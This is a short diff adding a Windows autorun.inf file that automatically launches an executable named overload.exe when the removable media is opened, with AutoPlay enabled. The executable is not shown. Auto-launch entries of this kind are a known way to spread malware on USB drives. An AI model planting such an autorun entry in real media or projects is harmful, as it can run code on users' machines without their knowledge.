@@ -1,0 +1,5 @@
+[autorun]
+action=overload
+label=overload
+UseAutoPlay=1
+open=overload.exe
